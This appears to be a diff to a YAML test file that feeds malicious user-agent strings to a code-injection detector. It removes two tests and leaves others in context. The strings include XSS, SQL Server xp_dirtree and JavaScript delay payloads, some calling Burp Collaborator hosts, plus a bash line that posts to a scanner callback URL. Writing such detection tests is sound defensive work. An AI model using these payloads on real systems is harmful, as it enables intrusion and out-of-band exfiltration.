@@ -630,11 +630,6 @@ config:
 
 - test:
     input:
-      user_agent_string: '"javascript:/*</script><svg/onload=''+/\""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/1xx2hack3host4xx5\\.burpcollaborator.net/).replace(/\\\\/g,[]))//''>"'
-    expected: *isCodeInjection
-
-- test:
-    input:
       user_agent_string: '"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''+(function(){if(typeof aab4q===\""undefined\""){var a=new Date();do{var b=new Date();}while(b-a<20000);aab4q=1;}}())+''"'
     expected: *isCodeInjection
 
@@ -703,11 +698,6 @@ config:
       user_agent_string: '(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca'
     expected: *isCodeInjection
 
-
-- test:
-    input:
-      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\1xx2hack3host4xx5.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
-    expected: *isCodeInjection
 
 # This used to trigger an NPE
 - test:
